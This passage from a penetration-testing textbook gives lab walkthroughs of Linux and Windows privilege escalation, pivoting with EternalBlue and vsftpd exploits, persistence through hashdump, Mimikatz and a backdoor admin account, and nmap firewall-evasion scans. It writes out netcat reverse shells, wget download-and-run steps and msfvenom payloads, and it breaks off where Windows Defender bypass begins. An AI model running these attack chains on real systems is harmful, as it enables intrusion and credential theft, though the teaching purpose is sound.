1.  To gain initial access to the targeted machine, Metasploitable2, we can exploit the DistCC vulnerability. In order to accomplish this using Metasploit, follow these steps and replace the placeholder with the IP address of your Metasploitable 2 target machine, as illustrated in [Figure 8.16](#ch08.xhtml_fig8-16):

    use exploit/unix/misc/distcc_exec

    set RHOST <target_host_IP>

    set payload cmd/unix/bind_ruby

    exploit

    ![](images/Figure_8.16.png)

    Figure 8.16: Gaining initial access to the targeted machine

2.  Now, let us execute the command whoami on the obtained shell. As shown in [Figure 8.17](#ch08.xhtml_fig8-17), we successfully gained access and are currently running the shell as the daemon user:

    ![](images/Figure_8.17.png)

    Figure 8.17: Got the shell with user privilege

[Phase 2: Preparing for privilege escalation using a Udev exploit](#contents.xhtml_sc4_221a)

1.  In order to escalate privileges, we require a kernel exploit. To determine the kernel version of the targeted machine, execute the following commands in the command shell, as depicted in [Figure 8.18](#ch08.xhtml_fig8-18):

    uname -a

    lsb_release -a

    ![](images/Figure_8.18.png)

    Figure 8.18: Determining the kernel version of the targeted machine

2.  Based on our findings, the target machine runs Ubuntu 8.04 with kernel version 2.6.24\. To discover privilege escalation exploits specific to this kernel, execute the command searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 in a new Kali Linux terminal. We will be utilizing the 8572.c exploit, as highlighted in [Figure 8.19](#ch08.xhtml_fig8-19):

    ![](images/Figure_8.19.png)

    Figure 8.19: Discover privilege escalation exploits specific to the discovered kernel version

3.  To make certain files, scripts, and exploits available for download, restart Apache2 by executing the command service apache2 restart on Kali. This step is crucial for enabling access to the desired resources, as depicted in [Figure 8.20](#ch08.xhtml_fig8-20):

    ![](images/Figure_8.20.png)

    Figure 8.20: Restart Apache2 service

4.  The chosen local exploit will execute the /tmp/run file on the target machine, which requires us to create it with our custom code or a connect-back script. In this case, we will utilize a simple netcat reverse shell. To create the file, run the command nano /var/www/html/run from a new terminal in Kali Linux. Then, enter the following lines while replacing the IP address with the address of our Kali Linux machine, as illustrated in [Figure 8.21](#ch08.xhtml_fig8-21):

    #!/bin/bash

    nc <kali_linux_IP> 5678 -e /bin/bash

    ![](images/Figure_8.21.png)

    Figure 8.21: Create connect-back script

5.  To facilitate the download of the 8572.c payload onto the targeted system, copy it from the parent directory to the html directory. This directory serves as a convenient location for downloading the payload, as demonstrated in [Figure 8.22](#ch08.xhtml_fig8-22):

    ![](images/Figure_8.22.png)

    Figure 8.22: Copying selected payload to the html directory

6.  Open a new terminal window and initiate the listener on your Kali Linux machine by executing the command nc -lvp 5678 as depicted in [Figure 8.23](#ch08.xhtml_fig8-23):

    ![](images/Figure_8.23.png)

    Figure 8.23: Start net cat listener

[Phase 3: Escalating privileges](#contents.xhtml_sc4_222a)

Execute the set of commands below from the low-privilege shell to upload the files from your Kali Linux machine to the target system, as depicted in [Figure 8.24](#ch08.xhtml_fig8-24):

cd /tmp

wget http://192.168.29.15/run

wget http://192.168.29.15/8572.c

![](images/Figure_8.24.png)

Figure 8.24: Uploading crafted files from your Kali Linux to the target system

1.  From the low-privilege shell, execute the commands given below to compile the exploit file and list the files, as illustrated in [Figure 8.25](#ch08.xhtml_fig8-25):

    gcc -o exploit 8572.c

    ls –l

    ![](images/Figure_8.25.png)

    Figure 8.25: Compiling the exploit

2.  According to the selected exploit documentation, we require the Process Identifier (PID) of the udevd netlink socket. To obtain this information, execute the following set of commands to list the network processes and identify the udev process. Finally, we have successfully identified the targeted PID, which is 2796. See [Figure 8.26](#ch08.xhtml_fig8-26):

    cat /proc/net/netlink

    ps aux | grep udev

    ![](images/Figure_8.26.png)

    Figure 8.26: Identifying the udev process

3.  From the low-privilege shell, execute the command ./exploit <PID> to escalate privileges and establish a reverse shell. Make sure to replace <PID> with the correct PID for your target system, as demonstrated in [Figure 8.27](#ch08.xhtml_fig8-27):

    ![](images/Figure_8.27.png)

    Figure 8.27: Running the uploaded exploit

4.  Now, navigate to the listener terminal, where you will observe a reverse shell after successfully exploiting the local exploit. To verify our elevated privileges, execute the command whoami which will confirm that we have obtained root access. With root privileges, we now have the capability to perform all necessary activities that require administrative control. See [Figure 8.28](#ch08.xhtml_fig8-28):

    ![](images/Figure_8.28.png)

    Figure 8.28: Shell with root privilege

| Note: In the realm of privilege escalation, the primary focus revolves around targeting vulnerabilities such as misconfigured file permissions, kernel exploits, service misconfigurations, weak authentication mechanisms, vulnerable software versions, and exploiting trust relationships. These vulnerabilities represent a significant portion of the security landscape, and the exploitDB offers a plethora of available exploits to aid in the process. Selecting the appropriate post-exploitation exploits depends on factors such as the target’s nature, position within the network, configuration, and implemented security controls. |

[Privilege escalation on Windows](#contents.xhtml_sc3_223a)

Let us delve into the stages of Windows privilege escalation by employing a methodical approach encompassing initial access, preparation, and privilege escalation.

[Phase 1: Initial access](#contents.xhtml_sc4_224a)

Our initial step entails obtaining a low privilege shell on the target system. To illustrate this process, we will generate a basic payload utilizing MSFvenom and try to get the meterpreter session. Follow the steps given below:

1.  Execute the following command in the Kali Linux terminal to generate an executable file: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.29.15 lport=6789 -f exe -o winpriv.exe. Save the resulting file as an executable, as illustrated in [Figure 8.29](#ch08.xhtml_fig8-29):

    ![](images/Figure_8.29.png)

    Figure 8.29: Building a payload with msfvenom

2.  Next, commence http.server, a lightweight and user-friendly module inherent to Python. It requires no elaborate configuration and can be executed effortlessly from any location. Execute the following command: sudo python3 -m http.server as depicted in [Figure 8.30](#ch08.xhtml_fig8-30):

    ![](images/Figure_8.30.png)

    Figure 8.30: Commencing http.server

3.  Run the following sequence of commands in the msfconsole to initiate the handler and start listening for incoming connections, as demonstrated in [Figure 8.31](#ch08.xhtml_fig8-31):

    use exploit/multi/handler

    set payload windows/x64/meterpreter/reverse_tcp

    set lhost 192.168.29.15

    set lhost 6789

    exploit

    ![](images/Figure_8.31.png)

    Figure 8.31: Initiating the handler

4.  Proceed to the browser on the target machine, download the payload, and execute it while logged in as a regular user, as demonstrated in [Figure 8.32](#ch08.xhtml_fig8-32):

    ![](images/Figure_8.32.png)

    Figure 8.32: Executing the payload on target machine

5.  We have successfully obtained the initial meterpreter session from the targeted machine, as depicted in [Figure 8.33](#ch08.xhtml_fig8-33):

    ![](images/Figure_8.33.png)

    Figure 8.33: Initial meterpreter session

6.  Execute the command getuid to retrieve the real user ID and verify that it corresponds to a normal user rather than root. Since we aim to escalate privileges, proceed by running the command getsystem in an attempt to attain system-level privileges. However, despite our efforts, all three techniques employed to gain system access have unfortunately failed to provide the desired outcome. Take a look at [Figure 8.34](#ch08.xhtml_fig8-34):

    ![](images/Figure_8.34.png)

    Figure 8.34: Trying to escalate system privileges

[Phase 2: Preparing for privilege escalation using bypass UAC](#contents.xhtml_sc4_225a)

Now, our objective is to bypass User Account Control (UAC) in order to achieve escalated privileges. UAC is a security feature present in Windows operating systems that safeguards against unauthorized system modifications. Follow the steps given below:

1.  Start by setting the current session in background, then enter the command ‘search bypassuac’ to locate a local exploit that targets Windows UAC bypass, as demonstrated in [Figure 8.35](#ch08.xhtml_fig8-35):

    ![](images/Figure_8.35.png)

    Figure 8.35: Search for a local exploit targeting Windows UAC bypass

[Phase 3: Escalating privileges](#contents.xhtml_sc4_226a)

Now comes the phase where we execute the privilege escalation exploit using the step-by-step approach outlined below:

1.  To activate the chosen exploit, run the command use exploit/window/local/bypassuac. Additionally, execute the command show options to review the necessary information, as illustrated in [Figure 8.36](#ch08.xhtml_fig8-36):

    ![](images/Figure_8.36.png)

    Figure 8.36: Select exploit and supply the required information

2.  To see all connected sessions, execute the command sessions -l. To select a specific session for addition, use the command set SESSION 1, as demonstrated in [Figure 8.37](#ch08.xhtml_fig8-37):

    ![](images/Figure_8.37.png)

    Figure 8.37: Setting meterpreter session

3.  Execute the command exploit to regain the meterpreter session, as depicted in [Figure 8.38](#ch08.xhtml_fig8-38):

    ![](images/Figure_8.38.png)

    Figure 8.38: Running the exploit

4.  Issue the command getuid to verify the current user, which will display the normal user once again. Proceed by running the commands getsystem and getuid subsequently. As a result, we will successfully obtain the NT AUTHORITY user, as demonstrated in [Figure 8.39](#ch08.xhtml_fig8-39):

    ![](images/Figure_8.39.png)

    Figure 8.39: Successfully obtained the NT AUTHORITY

| Note: Windows privilege escalation exploits weaknesses like misconfigured permissions, vulnerable services, unpatched vulnerabilities, DLL hijacking, weak passwords, insecure UAC settings, weak file/folder permissions, and insecure registry settings to elevate user privileges. |

[Exploring network pivoting](#contents.xhtml_sc2_227a)

Using a compromised system within a target network, network pivoting employs a technique to gain access to other systems or networks that would otherwise be inaccessible directly from the attacker’s initial entry point. It serves as a stepping stone or proxy, enabling the attacker to reach additional targets within the network.

[Pivoting approach](#contents.xhtml_sc3_228a)

We will illustrate the network attack plan using the example of two machines: Windows 7 and Metasploitable 2\. The approach to pivot the network, as demonstrated in [Figure 8.40](#ch08.xhtml_fig8-40), will follow the steps outlined below:

![](images/Figure_8.40.png)

Figure 8.40: Pivoting approach

1.  Gain initial entry to the network through Windows 7.

2.  Explore and collect network information, including IP addresses, subnets, and potential targets, once inside Windows 7.

3.  Exploit vulnerabilities on the Metasploitable 2 machine to gain access.

4.  Establish a pivot connection from Windows 7 to Metasploitable 2, enabling control over the compromised Metasploitable 2 machine.

Now, let us delve into this approach from a technical perspective, broken down into the following phases:

[Phase 1: Gain (initial) access to Windows 7](#contents.xhtml_sc4_229a)

By leveraging the power of the Metasploit Framework, you can exploit widely recognized vulnerabilities such as eternalblue, which takes advantage of a weakness in the Server Message Block (SMB) protocol. It specifically targets a vulnerability found in the SMBv1 implementation within Microsoft Windows operating systems.

1.  Execute the provided set of commands to obtain the initial access, as illustrated in [Figure 8.41](#ch08.xhtml_fig8-41):

    use exploit/windows/smb/ms17_010_eternalblue

    set RHOSTS 192.168.29.4

    exploit

    ![](images/Figure_8.41.png)

    Figure 8.41: Gaining (initial) access to Windows 7

[Phase 2: Network info gathering and pivot connection establishment](#contents.xhtml_sc4_230a)

1.  Next, it is necessary to add a route to the meterpreter session by executing the commands run autoroute –s 192.168.29.0/24 and route print, as demonstrated in [Figure 8.42](#ch08.xhtml_fig8-42):

    ![](images/Figure_8.42.png)

    Figure 8.42: Adding a route to the meterpreter session

2.  It is necessary to background the meterpreter session by executing the command background in order to utilize an auxiliary module for reconnaissance, as illustrated in [Figure 8.43](#ch08.xhtml_fig8-43):

    ![](images/Figure_8.43.png)

    Figure 8.43: Background the meterpreter session

3.  To proceed, the next step is to scan for other systems on the network. With meterpreter’s built-in ARP scanner, we can comprehensively scan the entire network for additional systems. Execute the provided set of commands, as illustrated in [Figure 8.44](#ch08.xhtml_fig8-44), to initiate the ARP scanning process and gather valuable information about the network’s composition:

    use post/windows/gather/arp_scanner

    set RHOSTS 192.168.29.0/24

    set SESSION 1

    run

    ![](images/Figure_8.44.png)

    Figure 8.44: Scanning the entire network for additional systems

4.  As depicted above, our ARP scan has successfully identified multiple machines/assets on the network. Now, let us proceed by selecting a specific host and conducting a port scan using the post auxiliary module, auxiliary/scanner/portscan/tcp, to determine the open ports. Execute the following sequence of commands, as illustrated in [Figure 8.45](#ch08.xhtml_fig8-45):

    use auxiliary/scanner/portscan/tcp

    set RHOSTS 192.168.29.146

    set PORTS 1-100

    set THREADS 50

    run

    ![](images/Figure_8.45.png)

    Figure 8.45: Conducting port scan using the post auxiliary module

[Phase 3: Network pivoting by exploiting Metasploitable 2 machine](#contents.xhtml_sc4_231a)

Let us proceed by backgrounding the meterpreter session and configuring the exploit to gain access to the internal system by specifically targeting Metasploitable 2, which is connected to the original target system running Windows 7\. Through post-reconnaissance analysis, we have identified the target asset as 192.168.29.146. Now, our focus will be on a service running on port 21, which is known to be vulnerable to the Very Secure FTP Daemon (VSFTPD) backdoor. The exploit use exploit/unix/ftp/vsftpd_234_backdoor is designed to exploit a specific vulnerability in the VSFTPD software. This exploit takes advantage of a backdoor that was introduced in VSFTPD version 2.3.4.

1.  To exploit this vulnerability, execute the following sequence of commands, as illustrated in [Figure 8.46](#ch08.xhtml_fig8-46):

    use exploit/unix/ftp/vsftpd_234_backdoor

    set RHOSTS <Metasploitable 2 IP>

    exploit

    ![](images/Figure_8.46.png)

    Figure 8.46: Exploiting the VSFTPD backdoor vulnerability on Metasploitable 2

2.  We are now able to access the shell of the internal system (Metasploitable 2). From here, we can perform various actions such as checking the system’s privileges, extracting sensitive information, and escalating privileges to gain access to the admin/root account, as depicted in [Figure 8.47](#ch08.xhtml_fig8-47):

    ![](images/Figure_8.47.png)

    Figure 8.47: Shell of the internal system (Metasploitable 2)

Furthermore, it is worth noting that the obtained shell can be enhanced to a meterpreter session through the utilization of the post-exploitation module called post/multi/manage/shell_to_meterpreter.

| Note: When selecting a network pivoting technique for VAPT, consider factors such as network topology, access, stealthiness, scalability, encryption, familiarity, risk assessment, and documentation. Prioritize techniques aligned with expertise, mitigating risks, and providing clear evidence for reporting purposes. |

[Persistence and lateral movement](#contents.xhtml_sc2_232a)

Persistence and lateral movement are crucial in advanced penetration testing. Persistence ensures sustained access by creating backdoors, installing rootkits, and maintaining control over compromised systems. Lateral movement expands through the network, thus compromising additional systems to gain higher privileges and access sensitive information. Together, they evaluate network security by emulating real-world attacker behavior.

[Strategies for persistent access and lateral movement](#contents.xhtml_sc3_233a)

In this scenario, we will illustrate lateral movement techniques on a Windows 7 machine by employing the following step-by-step approach:

1.  Obtain initial access to the Windows 7 machine.

2.  Perform credentials dumping using the hashdump tool to achieve persistence.

3.  Utilize the dumped credentials for authenticated exploitation.

4.  Explore remote desktop for enabling and creating a new user to facilitate GUI-based access.

Execute the provided set of commands on the Windows 7 system to acquire the initial access, as depicted in [Figure 8.48](#ch08.xhtml_fig8-48):

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS 192.168.29.4

exploit

![](images/Figure_8.48.png)

Figure 8.48: Exploiting Windows 7 system to acquire the initial access

[Persistence through hashdump techniques](#contents.xhtml_sc3_234a)

1.  To extract the hashed password(s), follow the provided set of commands demonstrated in [Figure 8.49](#ch08.xhtml_fig8-49):

    use post/windows/gather/smart_hashdump

    set SESSION 1

    run

    ![](images/Figure_8.49.png)

    Figure 8.49: Extract the hashed password(s)

2.  As displayed in [Figure 8.50](#ch08.xhtml_fig8-50), we have successfully obtained a dump of all users and their associated NTLM hashes stored in the SAM file:

    ![](images/Figure_8.50.png)

    Figure 8.50: Usernames and NTLM hashes

This information gives rise to the following use cases:

*   In many organizations, it is common for the same local administrator’s password to be shared across multiple systems. With this knowledge, we can leverage the previously obtained hash to potentially establish a meterpreter session (for authenticated exploits) on another Windows machine within the network.

*   Moreover, by cracking the hash using the methods explained in the earlier section of this chapter, we can retrieve the clear-text username and password. By combining both pieces of information, we can effectively establish and maintain a persistent presence within the targeted asset.

[Exploring RDP for lateral movement](#contents.xhtml_sc3_235a)

In order to establish persistence on the compromised system, we will enable Remote Desktop Protocol (RDP) on the targeted system and create a new user. This will allow us to maintain access and use remote desktop and the newly created user whenever needed.

Let us now examine this approach in a step-by-step manner:

1.  To begin, execute the command background to move the current meterpreter session to the background. Then, proceed with the following sequence of commands to enable RDP on the targeted system, as depicted in [Figure 8.51](#ch08.xhtml_fig8-51):

    use post/windows/manage/enable_rdp

    set SESSION 1

    run

    ![](images/Figure_8.51.png)

    Figure 8.51: Enable RDP

2.  To regain access to the meterpreter session, use the command sessions -1. Then, execute the command shell to obtain a shell on the compromised system, as depicted in [Figure 8.52](#ch08.xhtml_fig8-52):

    ![](images/Figure_8.52.png)

    Figure 8.52: Obtaining shell on the compromised system

3.  From there, add a new user with administrator privileges by executing the following set of commands, as illustrated in [Figure 8.53](#ch08.xhtml_fig8-53):

    net user ummedmeel pass@123 /add

    net localgroup Administrators ummedmeel /add

    ![](images/Figure_8.53.png)

    Figure 8.53: Adding a new user with administrator privileges

4.  Open the RDP client and enter the IP address of the compromised system. Click on Connect to establish the connection. Provide the username and password, and then click on OK, as depicted in [Figure 8.54](#ch08.xhtml_fig8-54):

    ![](images/Figure_8.54.png)

    Figure 8.54: Connect remote desktop

5.  And there we have it! We have successfully gained remote desktop access to the targeted system, as demonstrated in [Figure 8.55](#ch08.xhtml_fig8-55):

    ![](images/Figure_8.55.png)

    Figure 8.55: Gained remote desktop access

The following use cases can be derived from this scenario:

*   Installation of network monitoring tools to monitor network traffic effectively.

*   Utilizing the compromised system as a launching platform to install hacking tools and pivot to compromise the entire network.

*   Hosting malicious applications or programs on the compromised system.

*   Utilizing the compromised system as a proxy server for malicious purposes.

*   In the case of a domain system, the potential to compromise the entire Active Directory (AD) network.

[Unleashing the power of Mimikatz in meterpreter](#contents.xhtml_sc2_236a)

Discover the remarkable potential of Mimikatz, a post-exploitation tool designed to extract and manipulate credentials within Windows systems. When integrated with the advanced features of meterpreter, it transforms into an invaluable asset for penetration testers. Let us embark on an in-depth exploration of the dynamic capabilities offered by the seamless integration of Mimikatz within the meterpreter framework.

1.  Before proceeding, it is crucial to verify that the current meterpreter session has system-level access. To confirm this, execute the command getuid as illustrated in [Figure 8.56](#ch08.xhtml_fig8-56):

    ![](images/Figure_8.56.png)

    Figure 8.56: Execute the command getuid

2.  To load the Mimikatz module into memory, execute the command load kiwi. Metasploit offers a set of built-in commands for Mimikatz; however, utilizing the kiwi_cmd option grants unrestricted access to the complete array of features available in Mimikatz. See [Figure 8.57](#ch08.xhtml_fig8-57):

    ![](images/Figure_8.57.png)

    Figure 8.57: Load the Mimikatz module into memory

3.  To view the comprehensive list of available modules, run the command help kiwi as demonstrated in [Figure 8.58](#ch08.xhtml_fig8-58):

    ![](images/Figure_8.58.png)

    Figure 8.58: List of available modules

4.  To extract the hashes from the SAM file, execute the command lsa_dump_sam as illustrated in [Figure 8.59](#ch08.xhtml_fig8-59):

    ![](images/Figure_8.59.png)

    Figure 8.59: Extracting the hashes from the SAM file

5.  In addition, the command creds_all can be utilized to extract and dump the hashes, as exemplified in [Figure 8.60](#ch08.xhtml_fig8-60). This command provides a convenient and comprehensive approach to retrieve various credentials and associated hashes from the compromised system. Please refer to the following figure:

    ![](images/Figure_8.60.png)

    Figure 8.60: Credentials and associated hashes

| Note: Mimikatz also employs advanced techniques such as golden ticket and silver ticket attacks, providing persistent access and enabling lateral movement in compromised networks. Moreover, it facilitates credential manipulation, keylogging, certificate management, and virtual smart card creation to further enhance its capabilities. |

[Conclusion](#contents.xhtml_sc2_237a)

In conclusion, this chapter has provided a comprehensive journey through privilege escalation, hash cracking, and network pivoting. You have gained insights into securing and cracking passwords, explored elite and online tools, and understood the distinctions between hashing, encryption, and encoding. The importance of post-exploitation and lateral movement, along with strategies for persistent access and privilege escalation, has also been emphasized. The knowledge acquired will enhance your skills as a penetration tester, enabling you to uncover vulnerabilities, fortify security measures, and navigate complex scenarios to safeguard systems and networks effectively.

In the upcoming chapter, we will explore the art of bypassing security controls in computer networks. This includes bypassing Windows security controls, antivirus security controls, and firewall security controls. We will also delve into the realm of social engineering and various miscellaneous techniques used in penetration testing and cyber maturity assessment. This chapter will provide valuable insights and skills to assess and enhance the effectiveness of security controls in computer networks.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 9Bypass Security Controls](#contents.xhtml_ch09a)

[Introduction](#contents.xhtml_sc2_238a)

In this chapter, we will explore the art of bypassing security controls in computer networks. This includes bypassing Windows security controls, antivirus security controls, and firewall security controls. We will also delve into the realm of social engineering and various miscellaneous techniques used in penetration testing and cyber maturity assessment. This chapter will provide valuable insights and skills to assess and enhance the effectiveness of security controls in computer networks.

[Structure](#contents.xhtml_sc2_239a)

In this chapter, we will discuss the following topics:

*   Significance of bypassing security controls

*   Advancements in security controls

*   Security control bypass in network recon

*   Outsmarting Windows Defender

*   Antivirus evasion techniques and tools

    *   Harnessing Metasploit templates and custom binaries for antivirus evasion

    *   Shellter

    *   Unicorn

    *   Phantom-Evasion

    *   Invoke-stealth

*   Cutting-edge WAF evasion tactics

*   Evolving social engineering tactics

    *   Phishing simulation

    *   Gophish

[Objectives](#contents.xhtml_sc2_240a)

This chapter delves into the critical area of bypassing security controls, emphasizing their significance. It showcases advancements in security technologies and offers practical techniques for effective circumvention. Exploring themes like network exploration, evading Windows Defender, and advanced WAF methods, readers gain access to tools such as Metasploit templates, Shellter, and Gophish. Ultimately, readers will acquire a thorough grasp of evading security controls, empowering them to adeptly navigate and conquer sophisticated security measures.

[Significance of bypassing security controls](#contents.xhtml_sc2_241a)

Bypassing security controls encompasses multiple aspects. One of these aspects involves targeting assets hosted behind firewalls or protected by security measures such as endpoint security and Data Loss Prevention (DLP) to expand the attack surface, allowing for an evaluation of their security strength in the absence of those controls. This process includes identifying vulnerabilities, exploiting weaknesses, and gaining unauthorized access to critical systems and sensitive data. The second aspect is crucial for understanding an organization’s security posture and effectiveness. By successfully bypassing these controls, potential weaknesses that could be exploited by malicious actors are revealed, aiding in the identification of vulnerabilities overlooked during the initial design and implementation of security measures.

Furthermore, bypassing security controls offer valuable insights into the limitations and weaknesses of specific security technologies and mechanisms. It empowers penetration testers to evaluate the real-world effectiveness of various defense measures, such as network firewalls, Web Application Firewalls (WAFs), Intrusion Detection Systems (IDS), encryption protocols, and access controls. By highlighting the identified shortcomings, pen testers can generate an advisory report that includes recommendations. This report serves as a valuable resource for organizations, assisting them in formulating short, mid, and long-term investment plans to ensure adequate protection against emerging threats.

| Note: Bypassing security controls reveals overlooked vulnerabilities and exposes limitations in security technologies, enabling organizations to strengthen their defenses against emerging threats. |

[Advancements in security controls](#contents.xhtml_sc2_242a)

As technology advances, attackers continuously adapt their methods, making it crucial for penetration testers to understand and evaluate the latest developments in security controls. Now, let us delve into the notable enhancements in security controls, as illustrated in [Figure 9.1](#ch09.xhtml_fig9-1):

![](images/Figure_9.1.png)

Figure 9.1: Advancements in security controls

[Cutting-edge technologies](#contents.xhtml_sc3_243a)

In the realm of modern cybersecurity, three key advancements are reshaping the way organizations protect their digital assets:

*   Next-Gen firewalls: Enhance detection and prevention of sophisticated attacks with advanced features like deep packet inspection.

*   Behaviour-based anomaly detection: Swiftly detects deviations in network and user behavior, alerting security teams to potential threats.

*   AI-driven threat intelligence: Proactively hunts threats by analyzing datasets and correlating indicators, aiding threat identification and mitigation.

[Intelligent systems](#contents.xhtml_sc3_244a)

Two Intelligent systems that are driving the evolution of digital defense:

*   Machine learning and artificial intelligence: Incorporating machine learning and artificial intelligence improves security controls for real-time anomaly detection, automated response, and adaptive threat modeling.

*   Automation and orchestration: Security controls with automation streamline incident handling, enabling faster threat containment and mitigation.

[Evolving threat landscape](#contents.xhtml_sc3_245a)

The following are the two points highlighting the evolution of cybersecurity practices in response to increasingly sophisticated threats:

*   Zero trust architecture: This security model rejects automatic trust for users and devices, demanding continuous authentication and verification for accessing resources.

*   Advanced malware detection with machine learning: Security controls utilize machine learning algorithms to identify and counter sophisticated malware, including polymorphic and zero-day threats.

[Cloud specific security controls](#contents.xhtml_sc3_246a)

The following points discuss cloud-specific security controls and frameworks for securing cloud environments:

*   Cloud Security Posture Management (CSPM): These controls help to secure the cloud environment by monitoring configurations, identifying vulnerabilities, and ensuring compliance with best practices.

*   Cloud Security Matrix (CSM): CSM is a robust framework that guides organizations in securing their cloud environments. It incorporates industry-recognized standards like the Cloud Security Alliance (CSA), Cloud Controls Matrix (CCM), Center for Internet Security (CIS) controls and the National Institute of Standards and Technology (NIST) Cybersecurity Framework.

| Note: In the pursuit of adhering to the principles of Zero Trust architecture, it becomes imperative for organizations to prioritize the adoption of cutting-edge technologies, intelligent systems, and cloud-specific controls. |

[Security control bypass in network recon](#contents.xhtml_sc2_247a)

When it comes to bypassing security controls during reconnaissance using Nmap there are several techniques that can be employed. Let us explore each of these categories and their sub-sections, along with relevant commands and steps:

First, let us check whether Windows Firewall is enabled or disabled on the targeted Windows 10 machine. As illustrated in [Figure 9.2](#ch09.xhtml_fig9-2), it is observed that Windows Firewall is currently enabled:

![](images/Figure_9.2.png)

Figure 9.2: Windows Firewall is enabled

[Source port manipulation](#contents.xhtml_sc3_248a)

Source port manipulation involves altering the original source port to a frequently used port, thereby increasing the difficulty for IDS or firewalls to identify and thwart the scanning activity. To execute this technique, use the command nmap -g <common-source-port> targetIP as depicted in [Figure 9.3](#ch09.xhtml_fig9-3):

![](images/Figure_9.3.png)

Figure 9.3: Source port manipulation

[IP address spoofing / decoy IP](#contents.xhtml_sc3_249a)

IP address spoofing enables the creation or manual selection of a decoy IP address, presenting a significant hurdle for IDS or firewalls in accurately identifying the true source. To employ this technique, utilize the command nmap -S <decoy-IP> targetIP or nmap -D RND:<random host number> targetIP as demonstrated in [Figure 9.4](#ch09.xhtml_fig9-4):

![](images/Figure_9.4.png)

Figure 9.4: IP address spoofing

[Packet fragmentation](#contents.xhtml_sc4_250a)

The technique of packet fragmentation entails dispatching fragmented probe packets to the target, which are then reassembled upon reception. This approach can effectively bypass specific Intrusion Detection Systems (IDS) and firewalls. To utilize this technique, execute the command nmap -f targetIP as illustrated in [Figure 9.5](#ch09.xhtml_fig9-5):

![](images/Figure_9.5.png)

Figure 9.5: Packet fragmentation

[Spoofing MAC address](#contents.xhtml_sc3_251a)

MAC address spoofing involves altering the original MAC address to conceal the true identity of the sender. This technique is employed to mask the source of network traffic. To execute this method, use the command nmap --spoof-mac <spoofed-MAC> targetIP as depicted in [Figure 9.6](#ch09.xhtml_fig9-6):

![](images/Figure_9.6.png)

Figure 9.6: MAC address spoofing

[Custom packet creation](#contents.xhtml_sc3_252a)

Creating custom packets enables the sending of specialized packets to scan the target beyond firewalls and other security measures.

1.  The --data-length command facilitates the specification of the desired length for the appended data. To utilize this functionality, execute the command nmap --data-length <length> targetIP as exemplified in [Figure 9.7](#ch09.xhtml_fig9-7):

    ![](images/Figure_9.7.png)

    Figure 9.7: Custom packet creation (Data-length)

2.  The --data-string command allows for the addition of a specific string to the packets, allowing the inclusion of customized content. To utilize this feature, execute the command nmap --data-string "<string>" targetIP as exemplified in [Figure 9.8](#ch09.xhtml_fig9-8):

    ![](images/Figure_9.8.png)

    Figure 9.8: Custom packet creation (Data-string)

3.  The --data command, on the other hand, enables the inclusion of custom data in various formats, including binary, by providing the data in hexadecimal format. To utilize this functionality, execute the command nmap --data <hex string> targetIP as exemplified in [Figure 9.9](#ch09.xhtml_fig9-9):

    ![](images/Figure_9.9.png)

    Figure 9.9: Custom packet creation (Data)

[Nmap Scripting Engine scripts](#contents.xhtml_sc3_253a)

Nmap Scripting Engine (NSE) scripts enable the utilization of specific scripts tailored to bypass firewall restrictions and uncover vulnerabilities. These scripts encompass techniques like packet fragmentation, source port manipulation, IP address spoofing, and other methods explicitly devised to bypass firewalls. To execute the script, use the command nmap --script=firewall-bypass targetIP as depicted in [Figure 9.10](#ch09.xhtml_fig9-10):

![](images/Figure_9.10.png)

Figure 9.10: Nmap NSE Scripts

| Note: When performing reconnaissance for firewall bypass, it is vital to conduct extensive research on the target, employ covert scanning techniques, leverage encryption and tunneling methods, evade signature-based detection, and skillfully manipulate network traffic. |

[Outsmarting Windows Defender](#contents.xhtml_sc2_254a)

Windows systems come equipped with an inherent security control known as Windows Defender. In this section, our aim is to bypass the detection capabilities of Windows Defender and establish a reverse connection. To illustrate this, let us consider a scenario where we, as attackers, have gained low-privileged user access to a Windows 10 workstation within the victim organization. The system in question has Windows Defender actively running with all its protective measures enabled. Our objective is to execute multiple malicious scripts for enumeration and lateral movements, which could potentially be blocked by the defender.

We will explore this concept in two phases. The first phase involves generating a generic payload and assessing whether it gets blocked by the security measures. In the second phase, we will employ advanced methods to generate a payload that achieves Fully Undetectable (FUD) status, allowing us to bypass the security controls.

Phase 1: Exploring basic approach for reverse connection on Windows 10

In this section, we will utilize a basic approach to generate a reverse connection payload using msfvenom. Let us explore the step-by-step approach given below:

1.  Let us first check the enablement and update status of Windows Defender, as depicted in [Figure 9.11](#ch09.xhtml_fig9-11), [9.12](#ch09.xhtml_fig9-12) and [9.13](#ch09.xhtml_fig9-13):

    Refer to [Figure 9.11](#ch09.xhtml_fig9-11) below, illustrating the Windows 10 system designated as the target:

    ![](images/Figure_9.11.png)

    Figure 9.11: Windows 10 machine

    Depicted in [Figure 7.12](#ch07.xhtml_fig7-12) is the current status of Windows Defender, showcasing it is updated:

    ![](images/Figure_9.12.png)

    Figure 9.12: Updated Windows Defender

    Depicted in [Figure 7.13](#ch07.xhtml_fig7-13) is the current status of Windows Defender, showcasing its enabled state:

    ![](images/Figure_9.13.png)

    Figure 9.13: Windows Defender is enabled

2.  Next, create a payload using the command msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_IP_Address> LPORT=<Listening_Port> -f <Payload_Format> -o <Output_File>, as illustrated in [Figure 9.14](#ch09.xhtml_fig9-14):

    ![](images/Figure_9.14.png)

    Figure 9.14: Create a payload using msfvenom

3.  Run the Apache HTTP server by running command python3 –m http.server 8080 to facilitate the transfer of the payload to the targeted machine, as demonstrated in [Figure 9.15](#ch09.xhtml_fig9-15):

    ![](images/Figure_9.15.png)

    Figure 9.15: Run the Apache HTTP server

4.  Now, open the browser on the Windows 10 machine and visit the URL https://192.168.29.15/winpayload.exe to initiate the payload download, as shown in [Figure 9.16](#ch09.xhtml_fig9-16):

    ![](images/Figure_9.16.png)

    Figure 9.16: Downloading payload on target machine

5.  At this stage, we observe that Windows Defender has blocked the payload even before execution. Therefore, we cannot execute the payload and establish a reverse connection using this approach. See [Figure 9.17](#ch09.xhtml_fig9-17):

    ![](images/Figure_9.17.png)

    Figure 9.17: Windows Defender has blocked the payload

Phase 2: Bypassing Windows Defender with hoaxshell and AMSI trigger

